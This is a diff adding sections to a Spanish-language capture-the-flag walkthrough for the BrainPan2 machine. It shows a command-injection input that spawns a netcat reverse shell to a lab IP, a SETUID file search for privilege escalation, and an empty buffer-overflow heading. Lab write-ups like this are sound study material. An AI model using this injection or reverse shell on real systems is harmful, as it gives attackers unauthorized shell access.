@@ -59,6 +59,52 @@ El archivo EXE realmente es una archivo del JPEG
 
 <img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain3.jpg" width="60%"></img>
 
-## Conexión 
+## Inyección de comandos
+
+1. La conexión indica que ingresemos con el usuario "GUEST"
+
+<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain4.jpg" width="60%"></img>
+
+2. Buscamos las opciones que puedan permitir INYECCIÓN
+El comando VIEW permite realizar inyecciones de comandos.
+
+<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain5.jpg" width="60%"></img>
+
+3. A través de la INYECCIÓN ejecutamos un NETCAT para obtener conexión remota.
+
+```
+                         >> VIEW
+    ENTER FILE TO DOWNLOAD: id; nc -e /bin/sh 192.168.78.131 5555
+```
+<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain6.jpg" width="60%"></img>
+
+
+## ELEVAR PRIVILEGIOS
+
+### Archivos con SETUID
+
+1. Buscamos archivos con el SETUID del usuario ROOT.
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain7.jpg" width="60%"></img>
+
+
+### BOF en Linux
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
